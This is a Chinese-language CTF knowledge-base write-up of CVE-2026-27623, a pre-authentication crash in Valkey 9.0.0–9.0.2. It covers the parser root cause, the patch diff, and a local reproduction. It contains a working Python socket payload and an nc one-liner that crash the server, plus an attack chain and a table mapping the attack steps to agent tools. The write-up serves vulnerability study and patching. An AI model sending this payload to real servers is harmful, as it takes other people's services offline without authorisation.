---
id: "ctf-website/11-dos/01-valkey-resp-dos"
title: "Valkey RESP 协议：预认证断言失败 DoS（CVE-2026-27623）"
title_en: "Valkey RESP Protocol Pre-Auth Assertion Failure DoS (CVE-2026-27623)"
summary: >
  Valkey 9.0.0-9.0.2 的 RESP 协议状态机存在 reqtype 残留缺陷。空 multibulk 请求后，reqtype 未清零，后续 PING 被误解析为 multibulk，触发断言失败导致进程 abort。预认证即可触发。
summary_en: >
  Valkey 9.0.0-9.0.2 contains a RESP protocol state machine flaw where reqtype is not cleared after consuming an empty multibulk request. Subsequent PING is misinterpreted as multibulk, triggering an assertion failure and process abort. Exploitable pre-authentication.
board: "ctf-website"
category: "11-dos"
signals: ["Valkey", "RESP", "Redis", "预认证", "pre-auth", "DoS", "CVE-2026-27623", "断言失败", "assertion failure"]
mcp_tools: ["http_probe", "run_ctf_tool", "kb_router"]
keywords: ["Valkey DoS", "CVE-2026-27623", "RESP protocol", "pre-auth DoS", "Redis DoS", "assertion failure", "预认证拒绝服务"]
difficulty: "intermediate"
tags: ["dos", "CVE", "valkey", "redis", "protocol", "pre-auth", "infrastructure"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Valkey RESP 协议：预认证断言失败 DoS（CVE-2026-27623）

## 1. 受影响版本

Valkey 9.0.0 – 9.0.2。修复版本：>= 9.0.3。补丁提交：`2c311dd7173ffc715a3d61266fdede6096a097de`。

## 2. 根因：RESP 状态机 reqtype 残留

`processInputBuffer` 同一轮 `read` 内可包含多段请求。第一段 `*0\r\n`（空 multibulk）被 `parseMultibulk` 消费后，`handleParseResults` 调用 `resetClient()` 清理 argv，但**旧版未将 `c->reqtype` 清零**。循环继续处理剩余数据 `PING\r\n` 时，仍按 multibulk 路径解析，断言 `querybuf[qb_pos] == '*'` 失败 → 进程 abort。

### 触发载荷（极简）

```python
import socket

payload = b"*0\r\nPING\r\n"  # 两段 pipeline：空 multibulk + inline
with socket.create_connection(("target", 6379)) as s:
    s.sendall(payload)
    try:
        print(s.recv(4096))
    except ConnectionResetError:
        print("server aborted")
```

### 状态机变化

| 步骤 | querybuf 剩余 | reqtype | 解析路径 | 结果 |
|------|--------------|---------|---------|------|
| 初始 | `*0\r\nPING\r\n` | 0 | 见 `*` → `PROTO_REQ_MULTIBULK` | 正常进入 multibulk |
| 第一次 parseMultibulk | `PING\r\n` | `MULTIBULK` | 消费 `*0\r\n`，`qb_pos` → `P` | 返回 `READ_FLAGS_PARSING_NEGATIVE_MBULK_LEN` |
| handleParseResults | `PING\r\n` | `MULTIBULK` | `resetClient`，旧版不清 `reqtype` | `reqtype` 仍为 MULTIBULK |
| 第二次 parseInputBuffer | `PING\r\n` | `MULTIBULK` | 跳过类型检测，仍走 multibulk | **`qb_pos` 处是 `P`，断言失败** |

### 修复 diff

```c
// handleParseResults 中的 NEGATIVE_MBULK_LEN 分支
resetClient(c);
c->reqtype = 0;  // ← 新增：清零 reqtype
return PARSE_OK;
```

## 3. 调用链

```
攻击者建立 TCP 连接到 Valkey 6379
    ↓ send *0\r\nPING\r\n（同一 TCP buffer 内 pipeline）
第一次 parseMultibulk 消费 *0\r\n，qb_pos 指向 'P'
    ↓ handleParseResults 调用 resetClient，reqtype 未清零
第二次 parseInputBuffer 跳过协议类型检测
    ↓ 仍按 multibulk 路径解析
parseMultibulk 断言 c->querybuf[c->qb_pos] == '*'
    ↓ qb_pos 处是 'P'，断言失败
serverAssertWithInfo(c, NULL, ...)
    ↓ valkey-server 进程 abort / 退出
```

## 4. 复现

```bash
# 编译受影响版本
git fetch --tags && git checkout 9.0.2
make distclean && make -j$(nproc)

# 启动服务（非常用端口）
./src/valkey-server --port 16379 --protected-mode no

# 发送攻击载荷
printf '*0\r\nPING\r\n' | nc -w 2 127.0.0.1 16379
```

### nc 触发后的典型输出

```text
=== VALKEY BUG REPORT START ===
<pid>:M <date> # === ASSERTION FAILED CLIENT CONTEXT ===
<pid>:M <date> # ==> networking.c:3528 'c->querybuf[c->qb_pos] == '*' is not true
```

### 本仓库 PoC

```bash
cd "CVE-2026-27623 Pre-Authentication DOS from malformed RESP request"
python3 exploit/exp.py
# 默认连接 127.0.0.1:16379
```

## 5. 修复后行为

9.0.3+ 上进程不崩；对 `*0` 一节的处理完成后，对 `PING` 返回 `+PONG`。

## 攻击链

```
1. 探测 Valkey/Redis 兼容端口可达 + 确认版本落在受影响区间
2. 建立预认证 TCP 连接（无需密码、无需命令权限）
3. 在同一 TCP buffer 中发送 *0\r\nPING\r\n pipeline 载荷
4. 第一次解析 *0 后 resetClient 未清理 reqtype
5. 第二次解析仍进入 multibulk 路径，qb_pos 指向 'P' 而非 '*'
6. networking.c 断言失败 → valkey-server abort → 预认证 DoS
7. 修复后重复发送载荷，应保持进程存活并对 PING 返回 +PONG
```

## Evidence

记录: 服务端崩溃日志、`networking.c:3528` 断言输出、nc 连接断开状态

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 Valkey / RESP / DoS 信号搜索 |
| 端口探测 | `http_probe` | 确认 Valkey 端口可达 |
| 写分析笔记 | `workspace_write_text` | 记录复现结果 |

## 参考资料

| 来源 | 链接 |
|------|------|
| GitHub Advisory | https://github.com/valkey-io/valkey/security/advisories/GHSA-93p9-5vc7-8wgr |
| 上游修复 | https://github.com/valkey-io/valkey/commit/2c311dd7173ffc715a3d61266fdede6096a097de |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-27623%20Pre-Authentication%20DOS%20from%20malformed%20RESP%20request |
